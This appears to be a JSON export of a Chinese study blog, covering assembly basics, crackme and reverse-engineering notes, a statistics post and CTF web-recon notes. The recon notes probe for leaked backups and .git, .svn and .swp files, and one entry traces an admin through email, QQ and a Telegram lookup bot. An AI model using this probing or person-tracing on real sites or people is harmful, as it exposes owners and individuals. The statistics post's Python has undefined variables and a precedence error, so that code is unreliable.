\u0026gt; x2):#上 print(\u0026#34;w\u0026#34;, end=\u0026#39;\u0026#39;) elif(x1 \u0026lt; x2):#下 print(\u0026#34;s\u0026#34;, end=\u0026#39;\u0026#39;) elif(y1 \u0026gt; y2):#左 print(\u0026#34;a\u0026#34;, end=\u0026#39;\u0026#39;) elif(y1 \u0026lt; y2):#右 print(\u0026#34;d\u0026#34;, end=\u0026#39;\u0026#39;) print(\u0026#39;}\u0026#39;) 随后md5加密\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/nssctf%E9%80%86%E5%90%91%E9%A2%98/","title":"nssctf逆向题"},{"content":"编辑：vim/edit\n编译：masm\n链接：link\n将内存2000:0，2000:1,2000:2,2000:3单元中的数据送入al,bl,cl,dl中\n1 2 3 4 5 6 7 mov ax,2000 mov ds,ax;段地址2000h送入ds mov bx,0;偏移地址0送入bx mov al,[bx];ds:bx单元中的数据送入al 1 2 3 4 5 mov ax,2000 mov ds,ax;段地址2000h送入ds mov al,ds:[0] 比较 1 2 3 4 5 6 7 mov al,[0];将常量0送入al中 mov al,ds:[0];(al)=((ds)*16+0) mov al,ds:[bx];(al)=((ds)*16+(bx)) mov al,ds:[bx];与上面相同 循环 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 assume cs:code code segment ​ mov ax,0ffffh ​ mov ds,ax;初始化ds:bx指向ffff:0 ​ mov bx,0;初始化累加寄存器dx,(dx)=0 ​ mov cx,12;初始化循环计数寄存器 s: mov al,[bx] ​ mov ah,0 ​ add dx,ax;间接向dx中加上((ds)*16+(bx))的数值 ​ inc bx ​ loop s ​ mov ax,4c00h ​ int 21h code ends end 复制 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 assume cs:code code segment ​ mov bx,0；偏移位置从0开始 ​ mov cx,12；循环12次 s: mov ax,0fffh ​ mov ds,ax；(ds)=0ffffh ​ mov dl,[bx]；(dl)=((ds)*16+(bx))，将ffff:bx中的数据送入dl ​ mov ax,0020h ​ mov ds,ax；（ds)=0020h ​ mov [bx],dl；（(ds)*16+bx）=(dl),将dl的数据送入0020:bx ​ inc bx；偏移位置加1 ​ loop s ​ mov ax,4c00h ​ int 21h code ends end 代码段中使用栈 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 assume cs:codesg codesg segment ​ dw 0123h,0456h,0789h,0abch,0defh,0fedh,0cbah,0987h ​ dw 0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0;用dw定义16个字型数据，在程序加载后，将取得16个字的内存空间，存放16个数据，在后面的程序中将这段空间当作栈来使用 start: mov ax,cs ​ mov ss,ax ​ mov sp,30h ​ mov bx,0 ​ mov cx,8 ​ s:push cs:[bx] ​ add bx,2 ​ loop s;将代码0-15单元中的8个字型数据依次入栈 ​ mov bx,0 ​ mov cx,8 ​ s0:pop cs:[bx] ​ add bx,2 ​ loop s0;出栈8个字型数据到代码段0-15单元 ​ mov ax,4c00h ​ int 21h codesg ends end start;指明程序的入口在start处 初始状态下栈为空，所以ss:sp要指向栈底\n将数据，代码，栈放入不同的段\nQA：CPU如何知道stack放栈，data放数据？ mov ax,stack\nmov ss,ax\nmov sp,20h\n设置ss指向stack，设置ss:sp指向stack:20\n大小写转换问题 思路：大写ASCII码的第5位为0，小写字母的第5位为1\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 assume cs:codesg,ds:datasg datasg segment db \u0026#39;Basic\u0026#39; db \u0026#39;iNfOrMaTiOn\u0026#39; datasg ends codesg segment start:mov ax,datasg mov ds,ax;设置ds指向daatsg mov bx,0;设置（bx）=0，ds:bx指向‘Basic’的第一个字母 mov cx,5;设置循环次数5，因为‘Basic’有5个字母 s:mov al,[bx];将ASCII码从ds:bx所指向的单元中取出 and al,11011111B;将al中的ASCII码的第5位置为0，变为大写字母 mov [bx],al;将转变后的ASCII码写回原单元 inc bx loop s mov bx,5 mov cx,11 s0:mov al,[bx] or al,00100000B;将第5位置变为1 mov [bx],al inc bx loop s0 mov ax,4c00h int 21h codesg ends end start [bx]一个内存单元\n[bx+idata]表示一个内存单元\n下面三个指令相同\nmov ax,[bx+200] mov ax,200[bx] mov ax,[bx],200 下面两个指令相同\nmov ax,[bx+si] mov ax,[bx] [si] (ax)=((ds)*16+(bx)+(si))\nidata是常量，bx,si是变量\nreg表示一个寄存器，sreg表示一个段寄存器\n关注机器指令处理的数据在什么地方\nmov bx,[0]；内存，ds:0单元\nmov bx,ax；CPU内部，ax寄存器\nmov bx,1；CPU内部，指令缓存器\n段地址（SA）和偏移地址（EA） mov ax,ds:[bp] (ax)=(ds)*16+(bp)\nSA=(ds)，EA=(bp)\nX ptr指明内存单元的长度，X再汇编指令中可以为word或byte\n例如mov word ptr ds:[0],1 指明了指令访问的内存单元是一个字单元\ndb字节型 dw字型 dd双字型数据\n如dd 100\ndup重复\ndw （重复次数） dump （数据）\n如db 3 dup (0) ,即db 0,0,0\ndb 3 dup(0,1,2),即db 0,1,2,0,1,2,0,1,2\n转移指令的原理 1 2 3 4 5 6 7 8 9 start:mov ax,0 mov bx,0 jmp short s add ax,1 s:inc REVIEW:1.从CS：IP指向内存单元读取指令，读取的指令进入指令缓冲器；2.(IP)=(IP)+所读取指令长度，从而指向下一条指令；3.执行指令，转到1，重复过程\nCS= ,IP= CS:IP指向EB 03（jump short s的机器码) 读取指令码EB 03进入指令缓冲器 IP=IP+所读取指令长度（2），指向add ax,1 CPU执行指令缓冲器中的指令EB 03（重点，如果EB 03没有对IP修改的话，应该执行add ax，1） 执行后，IP=000BH，CS:IP指向inc ax jmp word ptr 内存单元地址（段内转移）\njmp dword ptr 内存单元地址（段间转移）\njcxz相当于if((cx)==0)jump short 标号；\nloop相当于（cx)\u0026ndash;;if((cx)!=0)jump short 标号；\njump short s的转移范围是-128~127\noffset\nCPU执行ret指令，修改IP，pop IP\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\nCPU执行retf指令,修改CS和IP,POP IP,POP CS\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\n(IP)=((ss)*16+(sp))\n(sp)=(sp)+2\nCPU执行call指令，将CS和IP压入栈，转移,pump IP ;jmp near ptr标号\n(sp)-=2\n((ss)*16+(sp))=(IP)\nIP+=16位位移\ncall far ptr 相当于push CS; push IP; jmp far ptr\nmov ax,6;call ax将6存入ax，调用地址6处的函数\nmul做乘法，要么都是16位要么都是8位\nmul byte ptr ds:[0]\n(ax)=(al)*((ds)*16+0)\nZF标志：零标志位。结果为0，ZF=1（逻辑为真）,结果为1，ZF=0\nPF标志:奇偶标志位，bit位个数是否为偶数\nSF标志：符号标志位，非负，sf=1\nCF标志：进位标志符，\ncmp ax，bx即比较ax-bx\nje等于则转移\njne\njb低于则转移below\njnb不低于则转移\nja高于则转移above\njna不高于则转移\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80/","title":"汇编语言"},{"content":"入口E8 00 CALL ~ Add ~\nF7 步入\nF8 步出\nctrl+F9 execute till return 跳出函数\nctrl+G 移动到指定位置\nctrl+F2 重新调试\nF9 运行至断点处\nAlt + B 打开Breakpoints，列出断点\n；添加注释\nalt+M 内存模块\nctrl+E打开编辑窗口\n运行直接到断点处，步进步出逐行进行\n快速查找指定代码 从入口处不断F8直到某个函数被执行，弹窗 查找字符串检索（有个思路，可以再IDA中看函数模块的地址，再在xdbg中ctrl+G跳转到地址） 查找调用模块 在main()处打断点，记作返回点\n修改字符串\n跳转至字符串溢出区buffer（就是地址，可以用IDA先找一下），ctrl+E打开编辑窗 缺点：新字符串不能比原字符串长\n方法二： 把字符串存到缓冲区，修改PUSH处指令ctrl+E\n在原字符汇编指令处，空格键打开assemble窗口，改成”PUSH 504FF0“\n栈顶指针ESP：向栈压入数据，栈顶指针减小，向低地址移动，从栈中弹出数据时，栈顶指针增加（理解成一个无盖容器底部装了一弹簧）\n一些对于栈FILO（file in last out）的理解 在调试时，从一个函数入口处开始ESP地址减少，说明函数调用参数，把数据压入栈\ncrakeme2 F9运行后，首先调用的就是主函数\n401248处的push401E14命令来把401E14压入栈，然后40123D处CALL\u0026lt;\u0026gt;调用401232处的JMP ThunRTMain函数，会跳转到主函数ThunRTMain，前面的401E14的值作为ThunRTMain()的参数，这是一个间接调用，利用错误消息框和字符串，字符查找，往上找条件分支\n调用403329处的函数，比较函数值，再决定跳转\n栈帧 1 2 3 4 5 6 7 8 9 10 11 PUSH EBP ;函数开始 MOV EBP,ESP;保存当前ESP到EBP中 ....... ;无论ESP值如何变，EBP都保持不变 MOV ESP,EBP;将函数的起始地址返回到ESP中 POP EBP ;函数返回前弹出保存在栈中的EBP值 RETN ;函数终止 函数返回前要先从栈中删除与其对应的栈帧\n按照传递给rctMsgBox()参数的大小14清理栈\nRETN XX:根据传参的大小调整栈\nPE头 DOS头：typedef struct_IMAGE_DOS_HEADER,e_magic:DOS签名,e_ifanew:NT头偏移\nNT头：IMAGE_NT_HEADERS\nUPX upx -o 目标文件 源文件\n可以看到文件大小由67584变为48640，比ZIP压缩后大，是因为压缩后得到PE文件，需要添加PE头，并且还要放入解压缩代码\n调试notepad程序 先找到EP代码（偶然发现一个好办法，只要在开头ctrl+F8，结束后xdbg会自动暂停到入口点）EP开始时0101开头，前面都是0701开头\n在EP处ctrl+F8开始代码追踪，发现有一个短循环，在循环末尾设置断点，F9跳出循环\nUPX特征之一是,EP代码被包含在PUSHAD/POPAD指令之间，跳转到OEP代码的JMP指令紧接着出现在POPAD之后，只要在JMP指令处设置好断点，运行后就能直接找到OEP\nPE重定向原理 PE重定向就是PE文件无法加载到ImageBase所指位置，而是被加载到其他地址时发生的一系列的处理行为\n基本原理：在应用程序中查找硬编码的地址位置，读取值后，减去ImageBase(VA-RVA),加上实际加载地址（RVA-VA)\n先查找IMAGE_BASE_RELOCATION\n1 2 3 4 5 6 7 typedef struct _IMAGE_BASE_RELOCATION { DWORD VirtualAddress; // 重定位页的 RVA DWORD SizeOfBlock; // 重定位块的大小 WORD TypeOffset; // 重定位条目的类型于偏移 } _IMAGE_BASE_RELOCATION; typedef IMAGE_BASE_RELOCATION UNALIGNED * PIMAGE_BASE_RELOCATION; irtualAddress 重定位页 RVA。以映像装载基址加上页 RVA 的和作为被加数，再加上重定位项对应的 offset 就能得到其在内存中实际的 VA。最后一个重定位块的尾部也会添加一个 virtualaddress 字段作为结束标志。\nSizeOfBlock 基址重定位块的大小。包括 VirtualAddress，SizeOfBlock，以及后面 TypeOffset 的大小。\nTypeOffset 一个数组。数组中每个元素大小为 2 个字节，即 16 位。\ntype 高 4 位用于表示重定位的类型。\noffset 低 12 位用于表示重定位数据位置相对于页 RVA 的偏移量。与 VirtualAddress 相加就是要修改的重定位数据的指针，再加上映像装载基址就是修改后的指针。\n硬编码地址偏移：VirtualSize+Offset=1420(RVA)\n减去ImageBase值\n加上实际加载地址值\n从可执行文件中删除.reloc节区 前提：删除基础重定位表对运行没什么影响\n从文件偏移270开始，到297\n打开010Editor直接删除，至此,.reloc被物理删除，之后开始修改相关PE头信息（就像改配置一样）\n修改IMAGE_FILE_HEADER-NUMBER of SECTIONS，5改成4\n之后修改IMAGE_OPTIONAL_HEADER-size of image\nVirualSize时E40，Section Alignment值为1000，故要减去1000\nupack压缩后的文件 把PE文件头变形，这部分有点不太明白，大概就是增大SizeOfOptionalHeader的值，在IMAGE_OPTIONAL_HEADER和IMAGE_SECTION_HEADER之间添加额外空间，添加解码代码，如下\n从170开始是IMAGE_SECTION_HEADER\n打开section选项，观察到第一个节区和第三个节区rawoffset起始偏移都是10，由此可知Upack会对PE文件头，第一个节区，第三个节区进行重叠\n进行调试，先要找出EP入口，EP的RVA为1018，ImageBase为0100000，故EP的VA值为01001018，xdbg已经打好断点了\n（忘记保存了）\nWindows消息钩取 HookMain.exe最先加载Keyhook.dll安装键盘钩子，使用SetWindowsHookEX()安装键盘钩子，OS强制键盘输入事件，调用KeyHook.dll注入到相应进程的内存，调用KeuboardProc()函数，在ProcessExplorer中检索Keyhook.dll发现如下\n1 2 3 4 5 6 7 8 9 10 11 HHOOK SetWindowsHookEx( ​ int idHook,//hook type ​ HOOKPROC lpfn,//hook procedure ​ HINSTANCE hMod,//hook procedure所属的DLL句柄 ​ DWORD dwThreadId,//想要钩载的线程 ) ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/","title":"逆向核心原理"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 # F系列【主要是调试状态的处理】 F2 添加/删除断点 F4 运行到光标所在位置 F5 反汇编 F7 单步步入 F8 单步跳过 F9 持续运行直到输入/断点/结束 shift系列【主要是调出对应的页面】 shift+F1 Local types shift+F2 execute scripts【常用】 shift+F3 Functions shift+F4 Names shift+F5 Signatures shift+F7 Segments shift+F8 Segments registers shift+F9 Structures shift+F10 Enumerations shift+F11 Type libraries shift+F12 Strings【常用】 Shift+E 导出数据【常用】 # 单字符系列【基本是数据处理转换相关】【这些都比较常用】 G 按地址查找 D 将字符串等元素转为数据 N 重命名（函数名、变量名等） Y 修改变量类型等（比如int改char等等） H decimal 数据的进制快速转换 A 将数据转变为字符串类型 C code（将数据转变为汇编代码，分为自动和强制执行） U undefined（将字符串转变为原始数据） X 交叉引用（反汇编页面） P 选中位置识别为函数 # Ctrl、Alt系列 Ctrl+F 搜索【常用】 Ctrl+X 交叉引用（汇编页面）【常用】 Alt+T 查找Text Ctrl+T 查找下一个text Alt+C Next Code Ctrl+D Next Data Ctrl+Z 撤销 Ctrl+Shift+Z 恢复 Alt+K 修改堆栈值 # else / 添加注释 or 右键选择edit comment【常用】 \\ hide cast，隐藏/显示一些变量类型注解 Ins 添加区块注释 通用寄存器 EAX：（针对操作数和结果数据的）累加器 EBX：（DS段的数据指针）基址寄存器 ECX：（字符串和循环操作的）计数器 EDX：（I/O指针）数据寄存器 ESI：（字符串操作源指针）源变址寄存器 EDI：（字符串操作目标指针）目的变址寄存器 EBP：（SS段中栈内数据指针）扩展基址指针寄存器[栈帧寄存器、栈底指针寄存器] ESP：（SS段中栈指针）栈指针寄存器[指向栈顶] 段寄存器 CS：代码段寄存器 SS：栈段寄存器 DS：数据段寄存器 FS：数据段寄存器 ES：附加数据寄存器 GS：数据段寄存器 程序状态与控制寄存器 EFLAGS：标志寄存器，32个位元的01控制 ZF(零标志器，运算结果为0时置1) CF(进位标志，运算结果向最高位以上进位时置1) OF(溢出标志) AF(辅助进位标志，运算结果在第3位的时候置1) SF(符号标志，有符号整型的符号位为1时置1) 指令指针寄存器 EIP / RIP：保存CPU要执行的指令地址 常用指令 操作码 目的操作数 源操作数\nPUSH/POP：压栈/出栈 PUSHA/POPA 、 PUSHAD/POPAD MOV/CALL/RET/LEA/INT/EMD：传送 / 调用 / 返回 / 加载 / 中断 / 结束 CMP/TEST：比较/测试（结果丢弃，只修改标志位寄存器） JMP系列跳转指令 ADD/SUB/SHL/SHR/ROL/ROR：加 / 减 / 逻辑左移 / 逻辑右移 / 循环左移 / 循环右移 INC/DEC ：加一 / 减一 MUL/IMUL：无符号乘法、整数乘法 DIV/IDIV：无符号除法、整数除法 AND/XOR/OR/NOT：与 / 异或 / 或 / 取反 栈帧 1 2 3 4 5 6 7 8 PUSH EBP ;函数开始 MOV EBP,ESP ;将栈顶地址存入EBP中 .... ;函数执行，期间EBP地址不变 MOV ESP,EBP ;基准点地址给到ESP POP EBP ;栈状态恢复，弹出EBP RETN ;函 IDA常用脚本 IDC\u0026amp;python，具体可以看IDA的官方书籍\nIDC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 //获取寄存器的值 auto eax = GetRegValue(\u0026#34;EAX\u0026#34;); auto addr = 0x0; auto i = 0; for(i; i \u0026lt; 10; i = i+1) { //打印字节 Message(\u0026#34;%x\u0026#34;,Byte(addr+i)); //修改字节 PatchByte(addr+i,Byte()); } //dump数据 auto i,fp; fp = fopen(\u0026#34;D:\\\\dump2\u0026#34;,\u0026#34;wb\u0026#34;); for(i=0x10;i\u0026lt;0x12;i++) fputc(Byte(i),fp); print(\u0026#34;end\u0026#34;); python 1 2 3 4 5 6 7 8 # 导入头文件 from idaapi import * # 获取寄存器的值 espval = get_reg_val(\u0026#39;esp\u0026#39;) # 获取字节值ida_bytes.get_word() value = ida_bytes.get_word(address) # 获取16字节长度的数据 ida_bytes.get_bytes(address, 16) easy动态调试 思路：把不在主函数里面的函数运行下就行\nEIP修改为_ques函数的地址F9运行就行，拿到Flag\nez_xor 下面是XOR的encode函数\n一开始想了下a2是什么，发现就是传参\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { char flag1[] = \u0026#34;E`}J]OrQF[V8zV:hzpV}fVF[t\u0026#34;; char flag[] = \u0026#34;\u0026#34;; for (int i = 0; i \u0026lt; strlen(flag1); i++) { flag1[i] ^= 3 * 3; printf(\u0026#34;%s\\n\u0026#34;, flag1); } } 好无聊啊，想做PWN题了\nXOR 这道题主要是array要看懂\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 \\#include \u0026lt;stdio.h\u0026gt; \\#include \u0026lt;stdlib.h\u0026gt; \\#include \u0026lt;string.h\u0026gt; int main(int argc, char const *argv[]) { int flag1[] = {0x3FE, 0x3EB, 0x3EB, 0x3FB, 0x3E4, 0x3F6, 0x3D3, 0x3D0, 0x388, 0x3CA, 0x3EF, 0x389, 0x3CB, 0x3EF, 0x3CB, 0x388, 0x3EF, 0x3D5, 0x3D9, 0x3CB, 0x3D1, 0x3CD}; char flag[] = {}; for (int i = 0; i \u0026lt; 21; i++) { ​ flag[i] = (flag1[i] - 900) ^ 0x34; ​ printf(\u0026#34;%c\u0026#34;, flag[i]); } return 0; } CrakeMEV3 意思是要读取一个同目录下名为CRACJME3.KEY的文件，试过如果文件名不叫这个，调试暂停\n看到写在CRACKME3.KEY的字符，步进查看函数\nabexcrakeme3 思路：要找一本abex.l2c文件，那就自己创建一个，下面还有两个比较跳转，直接爆破，把两个jne nop掉，秒了\ncosh1.exe 第一个爆破点：把jz换成jmp，强制跳转，不用看条件\n继续找，在函数头下断点，由于程序已经运行，直接按check for CD\n算法：就是在各种光驱里面循环查找，找有没CD_CHECK.DAT的文件\nAcid_burn 第一个serial incorrect jge改成jmp\n第二个serial jnz给nop掉\n秒了\n算法分析：看右上角寄存器，自己输入1234放在寄存器EDX中，EAX是一段字符串，猜测明文是\u0026quot;CW-4018-CRACKED\u0026quot;\n拖到IDA中分析，找CRACKED所在的函数，差不多就是下面一段\n1 2 3 4 5 6 7 8 9 void Decryption(char* mima) { char szBuff[260]; unsigned long data = (unsigned long)mima[0]; data *= 0X29; data *= 2; sprintf(szBuff, \u0026#34;CW-%d-CRACKED\u0026#34;, data); printf(\u0026#34;%s \\r\\n\u0026#34;, szBuff); } fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) # 将每个字符转换为二进制字符串，并填充到 8 位 b1 = int(tmp,2) # 将拼接后的二进制字符串转换为十进制整数 s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31]# 将余数映射到 s_box 中的字符，并拼接到 s 中 b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay 动态调试crackme 经分析，string1和string2的子串比对，进而输出判断结果，在判断结束的地方下断点，ExitProcess(0)\nXDBG调试\n要求Name输入crackme\n一步步直到出现This serial sucks，回过去看看和那个字段做了比较，要比较的字段就是正确的serial\n一般在stramp下断点\nQA:为什么在程序失败返回才能出现正确的序列号\n[SWPUCTF 2021 新生赛]fakebase 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 flag = \u0026#39;xxxxxxxxxxxxxxxxxxx\u0026#39; s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; tmp = \u0026#39;\u0026#39; for i in flag: tmp += str(bin(ord(i)))[2:].zfill(8) b1 = int(tmp,2) s = \u0026#39;\u0026#39; while b1//31 != 0: s += s_box[b1%31] b1 = b1//31 print(s) \\# s = u#k4ggia61egegzjuqz12jhfspfkay 将flag中每个字符影射为字符集的code point, 转换为二进制, 再转换为十进制, 再转换为最低位在前的31进制,\n先把s逆回去\n1 2 3 4 5 6 7 8 9 import libnum s=\u0026#34;u#k4ggia61egegzjuqz12jhfspfkay\u0026#34;[::-1] s_box = \u0026#39;qwertyuiopasdfghjkzxcvb123456#$\u0026#39; print(s) for i in range(5): key = i for j in range((len(s))): key = key *31 + s_box.index(s[j]) print(libnum.n2s(int(key))) 看着答案，想起大一高代学的辗转相除，就是欧几里得算法\n扩展欧几里得算法可用于RSA加密等领域。\n假如需要求 1997 和 615 两个正整数的最大公约数,用欧几里得算法，是这样进行的：\n1997 ÷ 615 = 3 (余 152)\n615 ÷ 152 = 4(余7)\n152 ÷ 7 = 21(余5)\n7 ÷ 5 = 1 (余2)\n5 ÷ 2 = 2 (余1)\n2 ÷ 1 = 2 (余0)\n至此，最大公约数为1\n以除数和余数反复做除法运算，当余数为 0 时，取当前算式除数为最大公约数，所以就得出了 1997 和 615 的最大公约数 1。\n证法一 a可以表示成a = kb + r（a，b，k，r皆为正整数，且r不为0）\n假设d是a,b的一个公约数，记作d|a,d|b，即a和b都可以被d整除。\n而r = a - kb，两边同时除以d，r/d=a/d-kb/d，由等式右边可知m=r/d为整数，因此d|r\n因此d也是b,a mod b的公约数。\n因(a,b)和(b,a mod b)的公约数相等，则其最大公约数也相等，得证。\n","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E9%80%86%E5%90%91%E5%B0%8F%E7%99%BD/","title":"逆向小白"},{"content":"总体：X\n个体：Xi\n样本：(X1，X2，\u0026hellip;\u0026hellip;.Xn)随机变量\n样本值：n个独立样本的一次实现(x1,x2,\u0026hellip;\u0026hellip;.xn)具体的数\n随机抽样：无放回：近似独立同分布，n/N\u0026lt;1,放回:独立分布\n当n/N很小时，可将无放回看作有放回抽样 $$ proof: $$ 分层抽样：不独立\n分群抽样\n非参数统计，非参数估计，核密度估计，非参数假设检验\n非参数统计方法无需假定总体分布，可以通过样本信息来推断总体，而参数统计则需要已知或假定总体分布。因此较参数统计（即一般意义下的数理统计），非参数统计适用面更广。但非参数统计推断的准确度较低。应注意的是非参数统计只是不依赖总体分布，但有些统计量的信息还是需要知道，并且研究的对象依旧是反映总体特征的统计量。\n描述样本的中心化趋势 均值，可能会带来失帧\n中位数，样本从小到大排序的次序统计量的中间值\n众数\n变量的度量 为什么计算样本方差分母是n-1?\n极差，总体/样本方差，标准差\n分位数 百分位数，计算i=n*(p/100) 若i为整数，q(p)=(x[i]+x[i+1])/2\n若i不为整数q(p)=x[i]+1\n四分位数 Box-Whisker图 箱线图是一种基于五个数字摘要显示数据集的标准化方式：最小值、最大值、样本中位数以及第一和第三个四分位数。\nMinimum (*Q*0 or 0th percentile): the lowest data point in the data set excluding any outliers **最小值（*Q*0 或第 0 个百分位数）：**数据集中不包括任何异常值的最低数据点 Maximum (*Q*4 or 100th percentile): the highest data point in the data set excluding any outliers **最大值（*Q*4 或第 100 个百分位数）：**数据集中不包括任何异常值的最高数据点 Median (*Q*2 or 50th percentile): the middle value in the data set **中位数（*Q*2 或第 50 个百分位数）：**数据集中的中间值 First quartile (*Q*1 or 25th percentile): also known as the lower quartile q**n(0.25), it is the median of the lower half of the dataset. 第一四分位数（*Q*1 或第 25 个百分位数）：也称为*下四分位数qn*（0.25），它是数据集下半部分的中位数。 Third quartile (*Q*3 or 75th percentile): also known as the upper quartile q**n(0.75), it is the median of the upper half of the dataset.[7] 第三个四分位数（*Q*3 或第 75 个百分位数）：也称为*上四分位数qn*（0.75），它是数据集上半部分的中位数。[7] 数据分析推断前期：可视化！\n样本方差 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 def calculate_mean(numbers): s=sum(numbers) N=len(numbers) #calculate the mean mean = s/N return mean def find_diff(numbers): #find the mean mean=calculate_mean(numbers) diff=[] for i in numbers: diff.append(num-mean) return diff def calculate_variance(numbers): diff = find_diff(numbers) squ=[] for i in diff: squ.append(i**2) variance=sum(squ)/N-1 return variance 样本矩 ak\nbk\n样本偏度\n样本蜂度\n有无中心对称，左偏or右偏分布？看尾巴在哪一侧\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 def calculate_ak(numbers,k): N=len(numbers) ak=[] for i in numbers: ak.append(i**k) return ak def calculate_bk(numbers,k): N=len(numbers) bk=[] find_diff=0 mean=calculate_mean(numbers) for i in numbers: find_diff+=((i-mean)**k) return find_diff/N def yangben_piandu(numbers): return calculate_bk(numbers,3)/(calculate_bk(numbers,2)**1.5) def yangben_fengdu(numbers): return (calculate_bk(numbers,4)/(calculate_bk(numbers,2)**2)) -3 次序统计量 1 2 3 4 5 6 7 def order_statistics(numbers): if k\u0026lt;1 or k\u0026gt;len(numbers): return ValueError(\u0026#34;\u0026#34;) else: sorted_numbers=sorted(numbers) return sorted_numbers 设总体X~U(0,1),则第k个次序统计量的密度函数\n样本p分位数 1 2 3 4 5 6 7 8 9 10 def is_integer(n,p)： return isinstance(n*p,int) def calculate_p(numbers,n,p): N=len(numbers) numbers.sort() if is_integer: return numbers[n*p+1] else: return (numbers[n*p]+numbers[n*p+1])/2 三大抽样分布 统计量的构造 1 2 3 4 5 6 7 8 9 10 11 12 13 def fenbu1(numbers): k2=0 for i in len(numbers): k2 += numbers[i]**2 return k2 def fenbu2(numbers1,numbers2): F=0 N1=len(numbers1) N2=len(numbers2) a=fenbu1(numbers1)/N1 b=fenbu2(numbers2)/N2 F=a/b return F ","date":"2025-02-24T00:00:00Z","permalink":"https://Frederick2313072.github.io/p/%E6%95%B0%E7%90%86%E7%BB%9F%E8%AE%A1/","title":"数理统计"},{"content":"web2：view-source是一种协议，早期基本上每个浏览器都支持这个协议。后来Microsoft考虑安全性，对于WindowsXP pack2以及更高版本以后IE就不再支持此协议。但是这个方法在FireFox和Chrome浏览器都还可以使用。 如果要在IE下查看源代码,只能使用查看中的\u0026quot;查看源代码\u0026quot;命令.以前的使用方法：在浏览器地址栏中输入 view-source: URL\nweb3:打开burp suite然后在仪表盘选择新扫描输入url（网址）后点击确定，然后点击目标，选择相应\u0026ndash;raw就可以看见flag了or F12 \u0026mdash;\u0026gt;选择网络\u0026mdash;\u0026gt;F5刷新页面，查看响应头。\nweb4：robots.txt（爬虫协议）\nweb5：目录扫描：index.phps(php文件)\nphps文件泄露，phps存放着php源码,可通过尝试访问/index.phps读取,或者尝试扫描工具扫描读取.\nweb6：url/www.zip网站备份压缩文件 漏洞成因\n在网站的升级和维护过程中，通常需要对网站中的文件进行修改。此时就需要对网站整站或者其中某一页面进行备份。\n当备份文件或者修改过程中的缓存文件因为各种原因而被留在网站 web 目录下，而该目录又没有设置访问权限时，便有可能导致备份文件或者编辑器的缓存文件被下载，导致敏感信息泄露，给服务器的安全埋下隐患。\n该漏洞的成因主要有是管理员将备份文件放在到 web 服务器可以访问的目录下。\n该漏洞往往会导致服务器整站源代码或者部分页面的源代码被下载，利用。源代码中所包含的各类敏感信息，如服务器数据库连接信息，服务器配置信息等会因此而泄露，造成巨大的损失。\n被泄露的源代码还可能会被用于代码审计，进一步利用而对整个系统的安全埋下隐患。\n.rar .zip .7z .tar.gz .bak .swp .txt\n源码泄露 url/www.zip 得知隐藏目录/fl000g.txt\nweb7: dirsearch -u url 发现目录 /.git\nweb8 /.svn 代码版本管理工具\nweb9: 本题目的是让答题者了解到vim编辑器使用时会有一个缓存文件，这个缓存文件在保存时进行删除，但是在vim意外退出时这个缓存文件，会以源文件加一个.swp后缀进行保存，我们可以尝试访问这些文件来尝试获取一些文件。\n/index.php.swp\nweb10:network cookie\n本题目是让答题者了解到cookie，cookie一般用于在身份认证的过程中保存一些信息，用于服务器来验证身份,在测试中可以尝试注入等方式。可以使用burp/F12中的网络来查看\nweb11:dns查找域名\nweb12:查看robots.txt文件，用户名admin。密码：在页面的最下方 管理员界面：/admin\nweb13:/document.pdf，底部信息\n本题目的是答题者了解到很多的文章有许多的文档，可以在这些文档中发现很多信息，例如文件中有许多的信息泄露的地方，本题在底部的document这个这个文本中记录到有地址和密码。\nweb14:根据提示 泄露重要(editor)的信息 直接在url后面添加/editor 然后查看flag路径并且访问\nweb15:/admin 忘记密码，密保问题。首先，在网页最下方发现一个邮箱，于是就去QQ上搜索了一下QQ号，只是发现了一个账号，地点是陕西西安，社工搜索，telegram暗精灵\nweb16:考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag\nweb17:/backup.sql 